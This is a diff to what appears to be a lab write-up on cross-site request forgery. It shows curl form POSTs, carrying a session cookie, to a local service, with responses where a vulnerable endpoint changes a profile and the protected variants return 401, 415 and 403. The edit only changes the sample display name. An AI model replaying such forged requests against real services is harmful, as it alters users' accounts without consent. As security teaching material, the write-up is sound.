@@ -125,10 +125,10 @@ stand-in's echo of what reached the service; in the whole lab it is what
 
 ```console
 $ curl -s -i -X POST -H "cookie: vcx_session=$A" -H 'content-type: application/x-www-form-urlencoded' \
-    --data 'displayName=Cross-site+change' http://127.0.0.1:4400/api/v1/profile/preferences
+    --data 'displayName=Cross+site+change' http://127.0.0.1:4400/api/v1/profile/preferences
 HTTP/1.1 200 OK
 …
-{"echoed":true,"service":"accounts","reached":{"method":"PUT","path":"/internal/profile","protocol":"2.0","headers":{…,"cookie":"vcx_session=eyJ…",…},"body":{"displayName":"Cross-site change"}}}
+{"echoed":true,"service":"accounts","reached":{"method":"PUT","path":"/internal/profile","protocol":"2.0","headers":{…,"cookie":"vcx_session=eyJ…",…},"body":{"displayName":"Cross site change"}}}
 ```
 
 The observation that proves exploitation: the change crossed to the profile —
@@ -138,17 +138,17 @@ The same form through the counterparts:
 
 ```console
 $ curl -s -o /dev/null -w '%{http_code}\n' -X POST -H "cookie: vcx_session=$A" \
-    -H 'content-type: application/x-www-form-urlencoded' --data 'displayName=Cross-site+change' \
+    -H 'content-type: application/x-www-form-urlencoded' --data 'displayName=Cross+site+change' \
     http://127.0.0.1:4400/api/v1/profile/preferences/json
 401
 
 $ curl -s -o /dev/null -w '%{http_code}\n' -X POST -H "authorization: Bearer $A" \
-    -H 'content-type: application/x-www-form-urlencoded' --data 'displayName=Cross-site+change' \
+    -H 'content-type: application/x-www-form-urlencoded' --data 'displayName=Cross+site+change' \
     http://127.0.0.1:4400/api/v1/profile/preferences/json
 415
 
 $ curl -s -i -X POST -H "cookie: vcx_session=$A" -H 'content-type: application/x-www-form-urlencoded' \
-    --data 'displayName=Cross-site+change' http://127.0.0.1:4400/api/v1/profile/preferences/csrf
+    --data 'displayName=Cross+site+change' http://127.0.0.1:4400/api/v1/profile/preferences/csrf
 HTTP/1.1 403 Forbidden
 …
 Missing csrf secret
